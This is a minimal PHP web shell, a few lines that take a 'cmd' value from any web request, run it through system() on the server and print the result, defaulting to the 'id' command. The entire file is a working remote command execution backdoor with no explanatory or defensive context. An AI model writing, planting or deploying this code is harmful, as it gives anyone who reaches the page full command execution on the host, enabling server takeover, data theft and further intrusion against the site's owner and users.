<?php
    if(isset($_REQUEST['cmd'])) {
        $cmd = ($_REQUEST['cmd']);
    } else {
        $cmd = "id";
    }
    echo system($cmd);
?>
